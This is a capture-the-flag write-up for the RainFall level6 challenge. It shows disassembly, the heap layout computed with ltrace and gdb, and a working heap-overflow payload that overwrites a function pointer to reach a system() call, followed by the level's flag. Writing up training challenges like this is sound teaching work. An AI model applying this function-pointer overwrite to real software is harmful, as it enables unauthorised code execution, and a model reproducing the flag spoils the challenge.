Binary that can take more arguments, if no arguments are provided it seg faults.
Objdump shows 2 other functions besides main.
```
08048454 <n>:
 8048454:	55                   	push   %ebp
 8048455:	89 e5                	mov    %esp,%ebp
 8048457:	83 ec 18             	sub    $0x18,%esp
 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
 8048466:	c9                   	leave  
 8048467:	c3                   	ret    

08048468 <m>:
 8048468:	55                   	push   %ebp
 8048469:	89 e5                	mov    %esp,%ebp
 804846b:	83 ec 18             	sub    $0x18,%esp
 804846e:	c7 04 24 d1 85 04 08 	movl   $0x80485d1,(%esp)
 8048475:	e8 e6 fe ff ff       	call   8048360 <puts@plt>
 804847a:	c9                   	leave  
 804847b:	c3                   	ret   
```
So function n is our win function.
```
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp) --- 64 bytes for 1st malloc
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp) --- 4 bytes for 2nd malloc
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)------- 2nd = m
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx--- get argv[1] into edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)--- put 1st malloc var  into 1st argument of strcpy
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax -- calls function stored at 0X18(%esp)(m)
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret
   
(gdb) x /s 0x8048468
0x8048468 <m>:	 "U\211\345\203\354\030\307\004$х\004\b\350\346\376\377\377\311\303U\211\345\203\344\360\203\354 \307\004$@"

```
So now that we see how the program works, we see two problems. There is no input check for strcpy and the 2 mallocs are not freed. We also know that the 2 mallocs are next to eachother in the heap memory and only divided by some padding that we can get like this
```
level6@RainFall:~$ ltrace ./level6 pp
__libc_start_main(0x804847c, 2, 0xbffff6f4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64) = 0x0804a008
malloc(4) = 0x0804a050
strcpy(0x0804a008, "pp")                                                = 0x0804a008
puts("Nope"Nope
)                                                            = 5
+++ exited (status 5) +++

(gdb) print 0x0804a050 - 0x0804a008
$1 = 72
```
So the 2nd malloc will start after we fill the 64 bytes of the 1st + 8 bytes padding.
```
level6@RainFall:~$ python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/expl
level6@RainFall:~$ ./level6 $(cat /tmp/expl)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```